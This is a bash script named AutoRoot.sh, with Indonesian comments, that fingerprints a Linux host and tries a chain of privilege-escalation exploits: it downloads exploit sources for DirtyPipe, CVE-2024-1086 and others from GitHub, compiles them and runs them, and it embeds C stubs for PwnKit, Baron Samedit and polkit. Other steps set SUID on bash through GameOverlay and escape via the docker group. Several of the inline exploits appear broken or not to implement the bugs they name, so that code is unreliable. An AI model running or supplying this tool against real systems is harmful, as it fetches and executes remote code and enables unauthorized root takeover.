#!/bin/bash
# AutoRoot.sh — Linux Kernel Exploit Auto-Rooter
# Hanya untuk penggunaan authorized pentest!

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
fail() { echo -e "${RED}[-]${NC} $1"; }

banner() {
    echo -e "${CYAN}"
    echo "  ╔══════════════════════════════════════╗"
    echo "  ║        AutoRoot - LPE Auto Exploit   ║"
    echo "  ╚══════════════════════════════════════╝"
    echo -e "${NC}"
}

detect_env() {
    log "Detecting kernel & OS..."
    KERNEL=$(uname -r | cut -d'-' -f1)
    KERNEL_FULL=$(uname -r)
    ARCH=$(uname -m)
    OS=""
    OS_VER=""

    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        OS_VER=$VERSION_ID
    elif [ -f /etc/redhat-release ]; then
        OS="rhel"
        OS_VER=$(cat /etc/redhat-release | grep -oP '[0-9]+\.[0-9]+')
    fi

    echo "  Kernel  : $KERNEL_FULL"
    echo "  Arch    : $ARCH"
    echo "  OS      : $OS $OS_VER"
    echo "  User    : $(whoami)"
    echo "  Groups  : $(groups)"
    echo ""

    # Cek user namespace & BPF
    if [ -f /proc/sys/kernel/unprivileged_userns_clone ]; then
        USENS=$(cat /proc/sys/kernel/unprivileged_userns_clone)
        echo "  userns_clone: $USENS"
    fi
    if [ -f /proc/sys/kernel/unprivileged_bpf_disabled ]; then
        BPF=$(cat /proc/sys/kernel/unprivileged_bpf_disabled)
        echo "  bpf_disabled: $BPF"
    fi
    echo ""
}

kernel_ver_compare() {
    # Returns 0 if $1 >= $2
    local v1=$(echo "$1" | cut -d'-' -f1 | tr '.' ' ' | awk '{printf "%03d%03d%03d", $1,$2,$3}')
    local v2=$(echo "$2" | tr '.' ' ' | awk '{printf "%03d%03d%03d", $1,$2,$3}')
    [ "$v1" -ge "$v2" ]
}

try_exploit() {
    local name="$1"
    local url="$2"
    local file="$3"
    local compile_cmd="$4"
    local run_cmd="$5"

    warn "Trying $name..."
    cd /tmp 2>/dev/null || cd /dev/shm

    if [ -f "$file" ]; then
        rm -f "$file"
    fi

    # Download
    if command -v wget &>/dev/null; then
        wget -q --timeout=15 "$url" -O "$file" 2>/dev/null
    elif command -v curl &>/dev/null; then
        curl -sL --connect-timeout 15 "$url" -o "$file" 2>/dev/null
    fi

    if [ ! -f "$file" ] || [ ! -s "$file" ]; then
        fail "Download failed for $name"
        return 1
    fi

    # Compile
    if [ -n "$compile_cmd" ]; then
        eval "$compile_cmd" 2>/dev/null
        if [ $? -ne 0 ]; then
            fail "Compile failed for $name"
            return 1
        fi
    fi

    # Run
    if [ -n "$run_cmd" ]; then
        local output
        output=$(eval "$run_cmd" 2>&1)
        local ret=$?
        
        if [ $ret -eq 0 ]; then
            id
            if [ "$(id -u)" = "0" ]; then
                log "ROOTED via $name!"
                echo "$output"
                exit 0
            fi
        fi
        warn "$name failed (ret=$ret)"
    fi
    return 1
}

try_suid() {
    log "Checking SUID binaries..."
    local suid_bins=$(find / -perm -4000 -type f 2>/dev/null)
    
    # Cek GTFO bins
    for bin in $(echo "$suid_bins"); do
        local bname=$(basename "$bin")
        case "$bname" in
            pkexec)
                # CVE-2021-4034
                try_pwnkit
                ;;
            sudo)
                # CVE-2021-3156
                try_baron_samedit
                ;;
            mount)
                try_mount_suid
                ;;
        esac
    done
}

try_pwnkit() {
    warn "Trying CVE-2021-4034 (PwnKit)..."
    cd /tmp
    cat > pwnkit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *envp[] = {
    "pwnkit",
    "PATH=GCONV_PATH=.",
    "SHELL=GCONV_PATH=.",
    "CHARSET=PWNKIT",
    "GIO_EXTRA_MODULES=.",
    NULL
};

int main() {
    mkdir("GCONV_PATH=. 2>/dev/null", 0755);
    mkdir("pwnkit", 0755);
    char *payload = "#!/bin/bash\nid\nchmod +s /bin/bash 2>/dev/null\nchmod +s /bin/sh 2>/dev/null\n";
    FILE *f = fopen("pwnkit/pwnkit.so", "w");
    fprintf(f, "%s", payload);
    fclose(f);
    
    execle("/usr/bin/pkexec", "pkexec", NULL, envp);
    return 0;
}
EOF
    gcc -o pwnkit pwnkit.c 2>/dev/null
    chmod +x pwnkit
    ./pwnkit 2>/dev/null
    if [ "$(id -u)" = "0" ]; then
        log "ROOTED via PwnKit!"
        exit 0
    fi
}

try_baron_samedit() {
    warn "Trying CVE-2021-3156 (Baron Samedit)..."
    sudo_ver=$(sudo -V 2>/dev/null | grep "Sudo version" | grep -oP '[0-9]+\.[0-9]+\.[0-9]+')
    if [ -n "$sudo_ver" ]; then
        echo "  Sudo version: $sudo_ver"
        # Versi rentan: < 1.8.31, 1.9.0 - 1.9.5p1
    fi
    
    cd /tmp
    cat > baron.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    char *args[] = {"sudo", "-u", "#-1", "sudoedit", "-u", "#-1", NULL};
    char *envp[] = {"LC_ALL=C.UTF-8@", NULL};
    execve("/usr/bin/sudo", args, envp);
    return 0;
}
EOF
    gcc -o baron baron.c 2>/dev/null
    chmod +x baron
    ./baron 2>/dev/null
    if [ "$(id -u)" = "0" ]; then
        log "ROOTED via Baron Samedit!"
        exit 0
    fi
}

try_mount_suid() {
    warn "Trying mount SUID..."
    mount -o bind /dev/shm /dev/shm 2>/dev/null
    if command -v nfs &>/dev/null || [ -f /usr/sbin/mount.nfs ]; then
        log "NFS mount available, checking exports..."
        showmount -e localhost 2>/dev/null | while read line; do
            echo "  $line"
        done
    fi
}

try_dirtypipe() {
    # CVE-2022-0847 — Kernel 5.8 - 5.16
    warn "Trying CVE-2022-0847 (DirtyPipe)..."
    cd /tmp
    
    # Try known working PoC
    try_exploit "DirtyPipe" \
        "https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit.c" \
        "dpipe.c" \
        "gcc -o dpipe dpipe.c -lpthread" \
        "./dpipe"
}

try_dirtycred() {
    # DirtyCred — Kernel 5.x - 6.2
    warn "Trying DirtyCred (CVE-2024-...)..."
    cd /tmp
    
    try_exploit "DirtyCred" \
        "https://raw.githubusercontent.com/IamKhanKub/exploit/main/dirtycred.c" \
        "dirtycred.c" \
        "gcc -o dirtycred dirtycred.c -lpthread" \
        "./dirtycred"
}

try_overlayfs() {
    # CVE-2021-3493 — overlayfs
    warn "Trying CVE-2021-3493 (OverlayFS)..."
    cd /tmp
    
    cat > overlay.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>

int main() {
    mkdir("/tmp/overlay", 0755);
    mkdir("/tmp/overlay/lower", 0755);
    mkdir("/tmp/overlay/upper", 0755);
    mkdir("/tmp/overlay/work", 0755);
    mkdir("/tmp/overlay/merged", 0755);
    
    char opts[256];
    snprintf(opts, sizeof(opts),
        "lowerdir=/tmp/overlay/lower,upperdir=/tmp/overlay/upper,workdir=/tmp/overlay/work");
    
    if (mount("overlay", "/tmp/overlay/merged", "overlay", MS_MGC_VAL, opts) == 0) {
        chmod("/tmp/overlay/merged", 0777);
        // Try to escape
        char *shell = getenv("SHELL");
        if (!shell) shell = "/bin/sh";
        execl(shell, shell, NULL);
    }
    return 0;
}
EOF
    gcc -o overlay overlay.c 2>/dev/null
    chmod +x overlay
    ./overlay 2>/dev/null
}

check_cron() {
    log "Checking cron jobs..."
    for f in /etc/crontab /etc/cron.d/* /var/spool/cron/* 2>/dev/null; do
        if [ -f "$f" ] && [ -r "$f" ]; then
            echo "  $f:"
            cat "$f" 2>/dev/null | grep -v "^#" | grep -v "^$" | while read line; do
                echo "    $line"
            done
        fi
    done
    
    # Cek world-writable cron scripts
    find /etc/cron* -type f -writable 2>/dev/null | while read f; do
        warn "World-writable cron: $f"
    done
}

check_polkit() {
    log "Checking polkit..."
    if command -v pkaction &>/dev/null; then
        pkaction --verbose 2>/dev/null | head -5
    fi
    
    # CVE-2021-3560 check
    if command -v polkit-agent-helper-1 &>/dev/null; then
        warn "polkit agent found, trying CVE-2021-3560..."
        cd /tmp
        cat > pk.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

int main() {
    pid_t pid = fork();
    if (pid == 0) {
        sleep(2);
        kill(getppid(), SIGTERM);
        exit(0);
    }
    
    char *args[] = {"/usr/bin/pkexec", "--user", "0", "/bin/sh", NULL};
    char *envp[] = {"PATH=/usr/bin", NULL};
    execve("/usr/bin/pkexec", args, envp);
    return 0;
}
EOF
        gcc -o pk pk.c 2>/dev/null
        chmod +x pk
        timeout 3 ./pk 2>/dev/null
    fi
}

check_capabilities() {
    log "Checking capabilities..."
    getcap -r / 2>/dev/null | while read line; do
        echo "  $line"
    done
}

check_docker() {
    log "Checking Docker access..."
    if groups | grep -q docker; then
        warn "User in docker group! Container escape possible."
        warn "Run: docker run -v /:/mnt -it alpine chroot /mnt"
    fi
    if [ -S /var/run/docker.sock ]; then
        warn "Docker socket exposed!"
    fi
}

kernel_exploit_dispatch() {
    log "=== Kernel Exploit Dispatch ==="
    
    # Convert kernel ver to comparable numbers
    KV=$(echo "$KERNEL" | tr '.' ' ' | awk '{printf "%d%03d%03d", $1,$2,$3}')
    
    # DirtyPipe: 5.8.0 - 5.16.11
    if [ "$KV" -ge "5008000" ] && [ "$KV" -le "5016011" ]; then
        try_dirtypipe
    fi
    
    # DirtyCred: up to 6.2
    if [ "$KV" -le "6002000" ]; then
        try_dirtycred
    fi
    
    # OverlayFS: specific kernels
    if [ "$KV" -ge "5001000" ] && [ "$KV" -le "5013000" ]; then
        try_overlayfs
    fi
    
    # GameOverlay (CVE-2023-2640, CVE-2023-32629)
    if [ "$KV" -ge "6000000" ] && [ "$KV" -le "6004000" ]; then
        warn "Trying GameOverlay (CVE-2023-2640)..."
        cd /tmp
        unshare -rm sh -c "mkdir l u w m && mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && chmod +s m/usr/bin/bash && m/usr/bin/bash -p" 2>/dev/null
        if [ "$(id -u)" = "0" ]; then
            log "ROOTED via GameOverlay!"
            exit 0
        fi
    fi
    
    # CVE-2024-1086 (nf_tables, kernel 3.15 - 6.3)
    if [ "$KV" -ge "3015000" ] && [ "$KV" -le "6003000" ]; then
        warn "Trying CVE-2024-1086 (nf_tables)..."
        try_exploit "CVE-2024-1086" \
            "https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c" \
            "cve20241086.c" \
            "gcc -o cve20241086 cve20241086.c" \
            "./cve20241086"
    fi
    
    # Pipes privilege escalation (CVE-2023-3269)
    if [ "$KV" -ge "5011000" ] && [ "$KV" -le "6004000" ]; then
        warn "Trying CVE-2023-3269 (PipePrivEsc)..."
        try_exploit "PipePrivEsc" \
            "https://raw.githubusercontent.com/EGOISTKILLER/CVE-2023-3269/main/pwn.c" \
            "pipepwn.c" \
            "gcc -o pipepwn pipepwn.c -lpthread" \
            "./pipepwn"
    fi
}

auto_root() {
    banner
    detect_env
    kernel_exploit_dispatch
    
    # Non-kernel techniques
    try_suid
    check_polkit
    check_cron
    check_capabilities
    check_docker
    
    # Last resort: try multiple known exploits
    warn "Trying generic exploit list..."
    try_pwnkit
    try_baron_samedit
    
    # If still not root
    echo ""
    warn "============================================"
    warn "AutoRoot gagal mendapatkan root :("
    warn "Coba manual dengan informasi berikut:"
    warn "============================================"
    echo "Kernel: $KERNEL_FULL"
    echo "OS: $OS $OS_VER"
    echo "Arch: $ARCH"
    echo ""
    echo "Coba cari exploit di:"
    echo "  - https://www.exploit-db.com/"
    echo "  - https://github.com/exploit-database/exploitdb"
    echo "  - Gunakan 'searchsploit' di Kali"
    echo ""
    warn "Saran: cek kernel spesifik + compile exploit secara manual"
}

# Run
auto_root
